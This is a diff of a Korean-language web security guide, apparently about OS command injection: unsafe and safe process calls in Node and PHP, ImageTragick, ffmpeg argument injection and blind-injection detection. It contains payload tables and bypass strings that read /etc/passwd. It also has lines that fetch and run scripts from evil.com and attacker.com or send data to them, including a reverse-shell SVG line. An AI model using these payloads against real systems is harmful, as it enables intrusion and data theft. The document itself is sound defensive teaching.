+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="c1">// 안전 — execFile: 셸 경유 없이 바이너리에 인자 배열을 직접 넘긴다</span>
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="nx">execFile</span><span class="p">(</span><span class="s1">&#39;convert&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nx">filename</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;output.webp&#39;</span><span class="p">],</span><span class="w"> </span><span class="nx">callback</span><span class="p">);</span>
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="c1">// 또는 async/await</span>
+</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">stdout</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">execFileAsync</span><span class="p">(</span><span class="s1">&#39;convert&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nx">filename</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;output.webp&#39;</span><span class="p">]);</span>
+</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>
+</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a><span class="c1">// 안전 — spawn도 기본은 셸 미사용</span>
+</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a><span class="nx">spawn</span><span class="p">(</span><span class="s1">&#39;convert&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nx">filename</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;output.webp&#39;</span><span class="p">]);</span>
+</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a>
+</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a><span class="c1">// 다시 위험 — shell:true 옵션을 주면 exec와 동일해진다</span>
+</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a><span class="nx">spawn</span><span class="p">(</span><span class="s1">&#39;convert&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nx">filename</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;output.webp&#39;</span><span class="p">],</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">shell</span><span class="o">:</span><span class="w"> </span><span class="kt">true</span><span class="w"> </span><span class="p">});</span>
+</span></code></pre></div>
+<p><code>exec</code>는 문자열 하나를 셸에 넘기기 때문에 <code>filename</code>에 메타문자가 들어가면 인젝션이 발생한다. <code>execFile</code>은 바이너리와 인자를 분리해서 넘기므로 셸 해석 자체가 일어나지 않는다. <code>execFile</code>과 <code>spawn</code>은 <code>shell: true</code> 옵션이 없는 한 안전하다.</p>
+<h3 id="php">PHP<a class="headerlink" href="#php" title="Permanent link">&para;</a></h3>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="x">// 위험 — 모두 셸을 거친다</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="x">system(&quot;convert $filename output.webp&quot;);</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="x">exec(&quot;convert $filename output.webp&quot;);</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="x">shell_exec(&quot;convert $filename output.webp&quot;);</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="x">passthru(&quot;convert $filename output.webp&quot;);</span>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="x">$output = `convert $filename output.webp`;  // 백틱 연산자도 마찬가지</span>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="x">// 그나마 안전 — 인자 단위로 escapeshellarg를 거쳐야 함</span>
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="x">$cmd = &quot;convert &quot; . escapeshellarg($filename) . &quot; output.webp&quot;;</span>
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="x">exec($cmd);</span>
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="x">// 더 안전 — proc_open + 파이프 디스크립터 직접 제어</span>
+</span></code></pre></div>
+<p>PHP는 백틱 문자열 자체가 셸 실행 연산자라 한 번에 알아보기 어렵다. 코드 리뷰 시 <code>`</code> 문자가 변수와 함께 있는 패턴을 grep해야 한다.</p>
+<hr />
+<h2 id="메타문자-페이로드-패턴">메타문자 페이로드 패턴<a class="headerlink" href="#메타문자-페이로드-패턴" title="Permanent link">&para;</a></h2>
+<p>셸이 해석하는 메타문자를 알면 공격자가 무엇을 시도하는지 보인다. 방어 코드를 작성할 때도 이 목록을 기준으로 검증한다.</p>
+<table>
+<thead>
+<tr>
+<th>메타문자</th>
+<th>의미</th>
+<th>페이로드 예시</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>;</code></td>
+<td>명령 순차 실행</td>
+<td><code>image.jpg; cat /etc/passwd</code></td>
+</tr>
+<tr>
+<td><code>&amp;&amp;</code></td>
+<td>앞 명령 성공 시 다음 실행</td>
+<td><code>image.webp &amp;&amp; id</code></td>
+</tr>
+<tr>
+<td><code>\|\|</code></td>
+<td>앞 명령 실패 시 다음 실행</td>
+<td><code>nonexistent \|\| whoami</code></td>
+</tr>
+<tr>
+<td><code>\|</code></td>
+<td>파이프 (앞 출력 → 뒤 입력)</td>
+<td><code>image.webp \| nc attacker.com 4444</code></td>
+</tr>
+<tr>
+<td><code>&amp;</code></td>
+<td>백그라운드 실행</td>
+<td><code>image.webp &amp; curl evil.com/$(id)</code></td>
+</tr>
+<tr>
+<td><code>`cmd`</code></td>
+<td>명령 치환 (구식)</td>
+<td><code>image`whoami`.webp</code></td>
+</tr>
+<tr>
+<td><code>$(cmd)</code></td>
+<td>명령 치환 (현대)</td>
+<td><code>image$(whoami).webp</code></td>
+</tr>
+<tr>
+<td><code>&lt;(cmd)</code></td>
+<td>프로세스 치환</td>
+<td><code>&lt;(curl evil.com/sh)</code></td>
+</tr>
+<tr>
+<td><code>&gt;</code> <code>&gt;&gt;</code></td>
+<td>출력 리다이렉트</td>
+<td><code>image.webp &gt; /etc/cron.d/x</code></td>
+</tr>
+<tr>
+<td><code>\n</code></td>
+<td>명령 줄바꿈</td>
+<td><code>image.jpg\ncat /etc/passwd</code></td>
+</tr>
+<tr>
+<td><code>${IFS}</code></td>
+<td>공백 우회</td>
+<td><code>cat${IFS}/etc/passwd</code></td>
+</tr>
+</tbody>
+</table>
+<p>실무에서 자주 보는 우회 기법은 다음 두 가지다. 첫째, 공백을 <code>${IFS}</code>로 치환해서 단순 공백 차단을 우회한다. 둘째, 백슬래시로 메타문자를 끊어서 정규식 차단을 회피한다(<code>c\at /etc/passwd</code>).</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># 공백 차단을 우회하는 페이로드</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="o">{</span>cat,/etc/passwd<span class="o">}</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>cat<span class="nv">$IFS</span>/etc/passwd
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>cat<span class="o">&lt;&lt;&lt;</span><span class="k">$(</span>cat<span class="w"> </span>/etc/passwd<span class="k">)</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="c1"># 점이나 슬래시 차단을 우회</span>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>/???/p?sswd<span class="w">          </span><span class="c1"># 글로빙</span>
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="k">$(</span><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;\x2fetc\x2fpasswd&#39;</span><span class="k">)</span><span class="w">  </span><span class="c1"># 16진수 인코딩</span>
+</span></code></pre></div>
+<p>이런 우회를 일일이 막으려고 블록리스트를 쌓는 건 의미가 없다. 셸 자체를 호출하지 않는 게 유일한 정답이다.</p>
+<hr />
+<h2 id="파일-업로드--명령-인젝션-콤보">파일 업로드 + 명령 인젝션 콤보<a class="headerlink" href="#파일-업로드--명령-인젝션-콤보" title="Permanent link">&para;</a></h2>
+<p>가장 자주 발생하는 실전 시나리오다. 단독 명령 인젝션보다 파일 업로드와 결합된 형태가 훨씬 흔하다.</p>
+<pre class="mermaid-diagram"><code>flowchart LR
     A[공격자] --&gt;|파일 업로드| B[웹 앱]
     B --&gt;|파일명 그대로 저장| C[파일 시스템]
     B --&gt;|썸네일 생성| D[convert 호출]
     D --&gt;|셸 경유| E[메타문자 실행]
-    E --&gt;|RCE| F[리버스 셸]</code></pre> <p>업로드 시점에는 인젝션이 일어나지 않는다. 문제는 업로드된 파일을 후처리할 때다. 가장 위험한 후처리 로직은 다음과 같다.</p> <div class="language-python highlight"><pre><span></span><code><span id=__span-6-1><a id=__codelineno-6-1 name=__codelineno-6-1 href=#__codelineno-6-1></a><span class=c1># 사용자가 업로드한 파일명: &quot;; curl evil.com/sh | sh ;.webp&quot;</span>
-</span><span id=__span-6-2><a id=__codelineno-6-2 name=__codelineno-6-2 href=#__codelineno-6-2></a><span class=k>def</span><span class=w> </span><span class=nf>make_thumbnail</span><span class=p>(</span><span class=n>uploaded_filename</span><span class=p>):</span>
-</span><span id=__span-6-3><a id=__codelineno-6-3 name=__codelineno-6-3 href=#__codelineno-6-3></a>    <span class=n>cmd</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&quot;convert /uploads/</span><span class=si>{</span><span class=n>uploaded_filename</span><span class=si>}</span><span class=s2> /thumbs/thumb.webp&quot;</span>
-</span><span id=__span-6-4><a id=__codelineno-6-4 name=__codelineno-6-4 href=#__codelineno-6-4></a>    <span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=n>cmd</span><span class=p>)</span>
-</span></code></pre></div> <p>업로드 단계에서 파일명 검증을 안 하고 사용자 입력을 그대로 저장하면, 후처리에서 그 파일명이 명령줄에 들어간다. </p> <p>방어할 때는 두 단계에서 모두 막아야 한다. 업로드 시점에 파일명을 UUID나 해시로 강제 변경하고, 후처리 시점에는 셸을 거치지 않는 호출을 사용한다. 둘 중 하나만 막는 건 다른 한쪽이 뚫리면 의미가 없다.</p> <hr> <h2 id=이미지미디어-라이브러리-인자-인젝션>이미지/미디어 라이브러리 인자 인젝션<a class=headerlink href=#이미지미디어-라이브러리-인자-인젝션 title="Permanent link">&para;</a></h2> <p>ImageMagick, ffmpeg, ghostscript 같은 미디어 변환 도구는 인자 자체에 위험한 기능이 들어 있다. 셸 메타문자를 모두 막아도, 인자로 전달되는 값에 <code>-</code> 시작 옵션이 들어가면 그게 새 옵션으로 해석된다. 이걸 인자 인젝션(argument injection)이라고 한다.</p> <h3 id=imagemagick--imagetragick-cve-2016-3714>ImageMagick — ImageTragick (CVE-2016-3714)<a class=headerlink href=#imagemagick--imagetragick-cve-2016-3714 title="Permanent link">&para;</a></h3> <p>2016년에 터진 ImageTragick은 이 분야의 교과서 사례다. ImageMagick의 <code>convert</code>가 MVG와 SVG 포맷을 지원하는데, 이 포맷 안에 <code>url()</code> 지시어로 외부 자원을 참조할 수 있다. ImageMagick이 이 URL을 처리할 때 내부적으로 셸을 호출했다.</p> <div class="language-text highlight"><pre><span></span><code><span id=__span-7-1><a id=__codelineno-7-1 name=__codelineno-7-1 href=#__codelineno-7-1></a># 악성 SVG 파일 내용
-</span><span id=__span-7-2><a id=__codelineno-7-2 name=__codelineno-7-2 href=#__codelineno-7-2></a>push graphic-context
-</span><span id=__span-7-3><a id=__codelineno-7-3 name=__codelineno-7-3 href=#__codelineno-7-3></a>viewbox 0 0 640 480
-</span><span id=__span-7-4><a id=__codelineno-7-4 name=__codelineno-7-4 href=#__codelineno-7-4></a>fill &#39;url(https://example.com/image.webp&quot;|ls &quot;-la)&#39;
-</span><span id=__span-7-5><a id=__codelineno-7-5 name=__codelineno-7-5 href=#__codelineno-7-5></a>pop graphic-context
-</span></code></pre></div> <p>이 파일을 업로드하고 <code>convert input.svg output.webp</code>을 실행하면, ImageMagick이 URL을 가져오는 과정에서 따옴표 escape 처리를 잘못해 <code>ls -la</code>가 셸에서 실행됐다. 영향받은 서비스가 어마어마했다. Facebook, Slack, HackerOne 모두 보고를 받았고, 패치가 나오기 전까지 임시 조치로 ImageMagick의 <code>policy.xml</code>에서 MVG, MSL, HTTPS, URL 코더를 disable하라는 권고가 나왔다.</p> <p>당시 본 적 있는 공격 코드는 외부 서버에 리버스 셸을 받는 형태였다.</p> <div class="language-text highlight"><pre><span></span><code><span id=__span-8-1><a id=__codelineno-8-1 name=__codelineno-8-1 href=#__codelineno-8-1></a>fill &#39;url(https://attacker.com/x.webp&quot;|curl http://attacker.com/sh|bash;&quot;)&#39;
-</span></code></pre></div> <p>이 사고 이후로 운영 중인 ImageMagick은 반드시 <code>/etc/ImageMagick-*/policy.xml</code>을 점검해야 한다.</p> <div class="language-xml highlight"><pre><span></span><code><span id=__span-9-1><a id=__codelineno-9-1 name=__codelineno-9-1 href=#__codelineno-9-1></a><span class=nt>&lt;policymap&gt;</span>
-</span><span id=__span-9-2><a id=__codelineno-9-2 name=__codelineno-9-2 href=#__codelineno-9-2></a><span class=w>  </span><span class=nt>&lt;policy</span><span class=w> </span><span class=na>domain=</span><span class=s>&quot;coder&quot;</span><span class=w> </span><span class=na>rights=</span><span class=s>&quot;none&quot;</span><span class=w> </span><span class=na>pattern=</span><span class=s>&quot;MVG&quot;</span><span class=w> </span><span class=nt>/&gt;</span>
-</span><span id=__span-9-3><a id=__codelineno-9-3 name=__codelineno-9-3 href=#__codelineno-9-3></a><span class=w>  </span><span class=nt>&lt;policy</span><span class=w> </span><span class=na>domain=</span><span class=s>&quot;coder&quot;</span><span class=w> </span><span class=na>rights=</span><span class=s>&quot;none&quot;</span><span class=w> </span><span class=na>pattern=</span><span class=s>&quot;MSL&quot;</span><span class=w> </span><span class=nt>/&gt;</span>
-</span><span id=__span-9-4><a id=__codelineno-9-4 name=__codelineno-9-4 href=#__codelineno-9-4></a><span class=w>  </span><span class=nt>&lt;policy</span><span class=w> </span><span class=na>domain=</span><span class=s>&quot;coder&quot;</span><span class=w> </span><span class=na>rights=</span><span class=s>&quot;none&quot;</span><span class=w> </span><span class=na>pattern=</span><span class=s>&quot;HTTPS&quot;</span><span class=w> </span><span class=nt>/&gt;</span>
-</span><span id=__span-9-5><a id=__codelineno-9-5 name=__codelineno-9-5 href=#__codelineno-9-5></a><span class=w>  </span><span class=nt>&lt;policy</span><span class=w> </span><span class=na>domain=</span><span class=s>&quot;coder&quot;</span><span class=w> </span><span class=na>rights=</span><span class=s>&quot;none&quot;</span><span class=w> </span><span class=na>pattern=</span><span class=s>&quot;URL&quot;</span><span class=w> </span><span class=nt>/&gt;</span>
-</span><span id=__span-9-6><a id=__codelineno-9-6 name=__codelineno-9-6 href=#__codelineno-9-6></a><span class=w>  </span><span class=nt>&lt;policy</span><span class=w> </span><span class=na>domain=</span><span class=s>&quot;coder&quot;</span><span class=w> </span><span class=na>rights=</span><span class=s>&quot;none&quot;</span><span class=w> </span><span class=na>pattern=</span><span class=s>&quot;EPHEMERAL&quot;</span><span class=w> </span><span class=nt>/&gt;</span>
-</span><span id=__span-9-7><a id=__codelineno-9-7 name=__codelineno-9-7 href=#__codelineno-9-7></a><span class=w>  </span><span class=nt>&lt;policy</span><span class=w> </span><span class=na>domain=</span><span class=s>&quot;coder&quot;</span><span class=w> </span><span class=na>rights=</span><span class=s>&quot;none&quot;</span><span class=w> </span><span class=na>pattern=</span><span class=s>&quot;LABEL&quot;</span><span class=w> </span><span class=nt>/&gt;</span>
-</span><span id=__span-9-8><a id=__codelineno-9-8 name=__codelineno-9-8 href=#__codelineno-9-8></a><span class=nt>&lt;/policymap&gt;</span>
-</span></code></pre></div> <p>비슷한 사고가 이후로도 반복됐다. 2020년 GhostScript 관련 PostScript 코드 실행, 2022년 ImageMagick 7.x의 SVG 처리 우회 등이 같은 계열이다.</p> <h3 id=ffmpeg-인자-인젝션>ffmpeg 인자 인젝션<a class=headerlink href=#ffmpeg-인자-인젝션 title="Permanent link">&para;</a></h3> <p>ffmpeg은 입력 파일명에 <code>-</code> 로 시작하는 문자열이 오면 그걸 옵션으로 해석한다.</p> <div class="language-bash highlight"><pre><span></span><code><span id=__span-10-1><a id=__codelineno-10-1 name=__codelineno-10-1 href=#__codelineno-10-1></a><span class=c1># 사용자가 업로드한 파일명: &quot;-i /etc/passwd&quot;</span>
-</span><span id=__span-10-2><a id=__codelineno-10-2 name=__codelineno-10-2 href=#__codelineno-10-2></a>ffmpeg<span class=w> </span>-i<span class=w> </span><span class=s2>&quot;</span><span class=nv>$user_input</span><span class=s2>&quot;</span><span class=w> </span>output.mp4
-</span><span id=__span-10-3><a id=__codelineno-10-3 name=__codelineno-10-3 href=#__codelineno-10-3></a><span class=c1># 실제 실행: ffmpeg -i -i /etc/passwd output.mp4</span>
-</span></code></pre></div> <p>ffmpeg에는 임의 파일을 읽어서 출력 미디어에 자막이나 필터로 끼워 넣는 기능이 있다. 이 기능과 인자 인젝션이 결합되면 서버 파일 시스템의 임의 파일을 영상 안에 인코딩해서 빼낼 수 있다. SSRF로도 발전 가능하다.</p> <p>방어법은 사용자 입력 앞에 <code>--</code>를 붙여서 옵션 종료를 명시하거나, 파일명이 <code>-</code>로 시작하면 거부하는 것이다.</p> <div class="language-bash highlight"><pre><span></span><code><span id=__span-11-1><a id=__codelineno-11-1 name=__codelineno-11-1 href=#__codelineno-11-1></a><span class=c1># 옵션 종료 마커 사용</span>
-</span><span id=__span-11-2><a id=__codelineno-11-2 name=__codelineno-11-2 href=#__codelineno-11-2></a>ffmpeg<span class=w> </span>-i<span class=w> </span><span class=s2>&quot;./</span><span class=nv>$user_input</span><span class=s2>&quot;</span><span class=w> </span>output.mp4<span class=w>   </span><span class=c1># 더 안전: 상대 경로 prefix</span>
-</span></code></pre></div> <p>상대 경로 prefix(<code>./</code>)를 붙이는 건 의외로 잘 알려지지 않은 방어책인데, <code>-</code>로 시작하지 않게 만들기 때문에 인자 인젝션을 끊어버린다.</p> <hr> <h2 id=blind-명령-인젝션-탐지>Blind 명령 인젝션 탐지<a class=headerlink href=#blind-명령-인젝션-탐지 title="Permanent link">&para;</a></h2> <p>명령 결과가 응답에 노출되지 않는 환경에서는 결과를 직접 볼 수 없다. 이때 쓰는 두 가지 기법이 시간 지연과 외부 콜백이다.</p> <h3 id=시간-지연-기반-탐지>시간 지연 기반 탐지<a class=headerlink href=#시간-지연-기반-탐지 title="Permanent link">&para;</a></h3> <div class="language-bash highlight"><pre><span></span><code><span id=__span-12-1><a id=__codelineno-12-1 name=__codelineno-12-1 href=#__codelineno-12-1></a><span class=c1># 7초 정확히 지연되면 인젝션 확정</span>
-</span><span id=__span-12-2><a id=__codelineno-12-2 name=__codelineno-12-2 href=#__codelineno-12-2></a><span class=nv>input</span><span class=o>=</span><span class=k>$(</span>sleep<span class=w> </span><span class=m>7</span><span class=k>)</span>
-</span><span id=__span-12-3><a id=__codelineno-12-3 name=__codelineno-12-3 href=#__codelineno-12-3></a><span class=nv>input</span><span class=o>=</span><span class=sb>`</span>sleep<span class=w> </span><span class=m>7</span><span class=sb>`</span>
-</span><span id=__span-12-4><a id=__codelineno-12-4 name=__codelineno-12-4 href=#__codelineno-12-4></a><span class=nv>input</span><span class=o>=</span><span class=p>;</span><span class=w> </span>sleep<span class=w> </span><span class=m>7</span><span class=p>;</span>
-</span><span id=__span-12-5><a id=__codelineno-12-5 name=__codelineno-12-5 href=#__codelineno-12-5></a><span class=nv>input</span><span class=o>=&amp;&amp;</span><span class=w> </span>sleep<span class=w> </span><span class=m>7</span>
-</span><span id=__span-12-6><a id=__codelineno-12-6 name=__codelineno-12-6 href=#__codelineno-12-6></a><span class=nv>input</span><span class=o>=</span><span class=p>|</span><span class=w> </span>sleep<span class=w> </span><span class=m>7</span>
-</span></code></pre></div> <p>원래 응답이 200ms인데 페이로드 주입 시 7초가 걸리면 명령이 실행됐다는 뜻이다. 다만 네트워크 지연이나 캐시로 오탐이 발생할 수 있어, 보통 3초·5초·7초처럼 식별 가능한 값을 여러 번 보내서 패턴을 확인한다.</p> <h3 id=out-of-bandoob-콜백>Out-of-Band(OOB) 콜백<a class=headerlink href=#out-of-bandoob-콜백 title="Permanent link">&para;</a></h3> <p>시간 지연보다 신뢰도 높은 방법이다. 공격자 통제 도메인으로 DNS 조회나 HTTP 요청을 발생시킨다.</p> <div class="language-bash highlight"><pre><span></span><code><span id=__span-13-1><a id=__codelineno-13-1 name=__codelineno-13-1 href=#__codelineno-13-1></a><span class=c1># DNS 콜백 — nslookup이 거의 모든 시스템에 깔려 있다</span>
-</span><span id=__span-13-2><a id=__codelineno-13-2 name=__codelineno-13-2 href=#__codelineno-13-2></a><span class=nv>input</span><span class=o>=</span><span class=p>;</span><span class=w> </span>nslookup<span class=w> </span>unique-id.attacker-collab.net
-</span><span id=__span-13-3><a id=__codelineno-13-3 name=__codelineno-13-3 href=#__codelineno-13-3></a><span class=nv>input</span><span class=o>=</span><span class=k>$(</span>nslookup<span class=w> </span><span class=k>$(</span>whoami<span class=k>)</span>.attacker-collab.net<span class=k>)</span>
-</span><span id=__span-13-4><a id=__codelineno-13-4 name=__codelineno-13-4 href=#__codelineno-13-4></a>
-</span><span id=__span-13-5><a id=__codelineno-13-5 name=__codelineno-13-5 href=#__codelineno-13-5></a><span class=c1># HTTP 콜백 — 명령 실행 결과를 호스트명에 인코딩</span>
-</span><span id=__span-13-6><a id=__codelineno-13-6 name=__codelineno-13-6 href=#__codelineno-13-6></a><span class=nv>input</span><span class=o>=</span><span class=sb>`</span>curl<span class=w> </span>http://<span class=k>$(</span>hostname<span class=k>)</span>.attacker.com/<span class=sb>`</span>
-</span><span id=__span-13-7><a id=__codelineno-13-7 name=__codelineno-13-7 href=#__codelineno-13-7></a><span class=nv>input</span><span class=o>=</span><span class=sb>`</span>wget<span class=w> </span>http://attacker.com/<span class=k>$(</span>whoami<span class=k>)</span><span class=sb>`</span>
-</span></code></pre></div> <p><code>nslookup</code>을 쓰는 이유는 인터넷에 접속을 못하는 내부 서버라도 DNS 쿼리는 풀어주는 환경이 많기 때문이다. 회사 내부 네트워크의 DNS는 외부 도메인 쿼리를 외부로 위임하는 게 일반적이라, 80/443이 막혀 있어도 53번을 통해 데이터가 빠져나간다.</p> <p>Burp Collaborator나 interactsh 같은 도구가 이 OOB 인터랙션을 받아주는 서비스를 제공한다. 도메인 하나를 발급받고 페이로드에 박은 뒤, 콘솔에서 인바운드 DNS/HTTP 요청을 확인하는 방식이다.</p> <pre class=mermaid-diagram><code>sequenceDiagram
+    E --&gt;|RCE| F[리버스 셸]</code></pre>
+<p>업로드 시점에는 인젝션이 일어나지 않는다. 문제는 업로드된 파일을 후처리할 때다. 가장 위험한 후처리 로직은 다음과 같다.</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># 사용자가 업로드한 파일명: &quot;; curl evil.com/sh | sh ;.webp&quot;</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="k">def</span><span class="w"> </span><span class="nf">make_thumbnail</span><span class="p">(</span><span class="n">uploaded_filename</span><span class="p">):</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>    <span class="n">cmd</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;convert /uploads/</span><span class="si">{</span><span class="n">uploaded_filename</span><span class="si">}</span><span class="s2"> /thumbs/thumb.webp&quot;</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+</span></code></pre></div>
+<p>업로드 단계에서 파일명 검증을 안 하고 사용자 입력을 그대로 저장하면, 후처리에서 그 파일명이 명령줄에 들어간다. </p>
+<p>방어할 때는 두 단계에서 모두 막아야 한다. 업로드 시점에 파일명을 UUID나 해시로 강제 변경하고, 후처리 시점에는 셸을 거치지 않는 호출을 사용한다. 둘 중 하나만 막는 건 다른 한쪽이 뚫리면 의미가 없다.</p>
+<hr />
+<h2 id="이미지미디어-라이브러리-인자-인젝션">이미지/미디어 라이브러리 인자 인젝션<a class="headerlink" href="#이미지미디어-라이브러리-인자-인젝션" title="Permanent link">&para;</a></h2>
+<p>ImageMagick, ffmpeg, ghostscript 같은 미디어 변환 도구는 인자 자체에 위험한 기능이 들어 있다. 셸 메타문자를 모두 막아도, 인자로 전달되는 값에 <code>-</code> 시작 옵션이 들어가면 그게 새 옵션으로 해석된다. 이걸 인자 인젝션(argument injection)이라고 한다.</p>
+<h3 id="imagemagick--imagetragick-cve-2016-3714">ImageMagick — ImageTragick (CVE-2016-3714)<a class="headerlink" href="#imagemagick--imagetragick-cve-2016-3714" title="Permanent link">&para;</a></h3>
+<p>2016년에 터진 ImageTragick은 이 분야의 교과서 사례다. ImageMagick의 <code>convert</code>가 MVG와 SVG 포맷을 지원하는데, 이 포맷 안에 <code>url()</code> 지시어로 외부 자원을 참조할 수 있다. ImageMagick이 이 URL을 처리할 때 내부적으로 셸을 호출했다.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a># 악성 SVG 파일 내용
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>push graphic-context
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>viewbox 0 0 640 480
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>fill &#39;url(https://example.com/image.webp&quot;|ls &quot;-la)&#39;
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>pop graphic-context
+</span></code></pre></div>
+<p>이 파일을 업로드하고 <code>convert input.svg output.webp</code>을 실행하면, ImageMagick이 URL을 가져오는 과정에서 따옴표 escape 처리를 잘못해 <code>ls -la</code>가 셸에서 실행됐다. 영향받은 서비스가 어마어마했다. Facebook, Slack, HackerOne 모두 보고를 받았고, 패치가 나오기 전까지 임시 조치로 ImageMagick의 <code>policy.xml</code>에서 MVG, MSL, HTTPS, URL 코더를 disable하라는 권고가 나왔다.</p>
+<p>당시 본 적 있는 공격 코드는 외부 서버에 리버스 셸을 받는 형태였다.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>fill &#39;url(https://attacker.com/x.webp&quot;|curl http://attacker.com/sh|bash;&quot;)&#39;
+</span></code></pre></div>
+<p>이 사고 이후로 운영 중인 ImageMagick은 반드시 <code>/etc/ImageMagick-*/policy.xml</code>을 점검해야 한다.</p>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nt">&lt;policymap&gt;</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="w">  </span><span class="nt">&lt;policy</span><span class="w"> </span><span class="na">domain=</span><span class="s">&quot;coder&quot;</span><span class="w"> </span><span class="na">rights=</span><span class="s">&quot;none&quot;</span><span class="w"> </span><span class="na">pattern=</span><span class="s">&quot;MVG&quot;</span><span class="w"> </span><span class="nt">/&gt;</span>
